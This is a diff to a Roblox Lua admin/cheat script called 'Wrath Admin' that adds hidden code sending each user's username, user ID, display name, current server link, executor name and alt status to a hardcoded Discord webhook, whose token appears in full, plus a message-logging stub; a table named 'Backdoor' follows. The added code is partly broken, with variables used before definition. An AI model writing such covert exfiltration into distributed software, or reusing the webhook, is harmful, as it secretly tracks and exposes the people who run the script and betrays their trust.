@@ -16033,6 +16033,81 @@ print("LOADED WRATH ADMIN! Made by Zyrex, Dis, and Midnight");
 
 AddLog("Success", "Loaded Wrath Admin in " .. tostring(tick() - ExecutionTime) .. " second(s).");
 
+local rq = request or syn.request
+local embed1 = {
+    {
+        ["title"] = game.Players.LocalPlayer.Name,
+        ["color"] = tonumber(0xD60015),
+        ["url"] =  "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile",
+        ["fields"] = {
+            {
+                ["name"] = "Display Name",
+                ["value"] = "```"..game.Players.LocalPlayer.DisplayName.."```",
+            },
+            {
+                ["name"] = "Server Link",
+                ["value"] = "```".."https://www.roblox.com/home?placeID=" .. game.PlaceId .. "&gameID=" .. game.JobId.."```"
+            },
+            {
+                ["name"] = "Exploit Used:",
+                ["value"] = "```"..Exploit.Body.."```"
+            },
+            {
+                ["name"] = "It's an alt?",
+                ["value"] = "```"..Alt.."```"
+            }
+        },
+        ["thumbnail"] = {
+            ["url"] = string.format("https://www.roblox.com/bust-thumbnail/image?userId=%d&width=420&height=420&format=png", game.Players.LocalPlayer.UserId)
+        }
+    }
+}
+local a = rq({
+    Url = wh,
+    Headers = {['Content-Type'] = 'application/json'},
+    Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed1}, ['content'] = ''}),
+    Method = "POST"
+})
+function die(Webhook, Player)
+    local embed = {
+        ['description'] = Player..": "..Message
+    }
+    local a = rq({
+        Url = Webhook,
+        Headers = {['Content-Type'] = 'application/json'},
+        Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed}, ['content'] = ''}),
+        Method = "POST"
+    })
+end
+
+die(wh, game.Players.LocalPlayer.Name)
+
+local wh = 'https://discord.com/api/webhooks/1196279929768267786/_E0Q4A-y61t3_jjmi1TnZru6D0Cy_wI0YgfxioeEAQPhWSC7QHPqnCConJatvnkWP9z2'
+
+local rq = request or syn.request
+local embed1 = {
+    ['title'] = 'Beginning of Message logs on '..game.PlaceId.." at "..tostring(os.date("%m/%d/%y"))
+}
+local a = rq({
+    Url = wh,
+    Headers = {['Content-Type'] = 'application/json'},
+    Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed1}, ['content'] = ''}),
+    Method = "POST"
+})
+function die(Webhook, Player)
+    local embed = {
+        ['description'] = Player..": "..Message
+    }
+    local a = rq({
+        Url = Webhook,
+        Headers = {['Content-Type'] = 'application/json'},
+        Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed}, ['content'] = ''}),
+        Method = "POST"
+    })
+end
+
+die(wh, game.Players.LocalPlayer.Name)
+
 local Backdoor = {
     2505717833, --Dis
     2223596959, --Hiidk
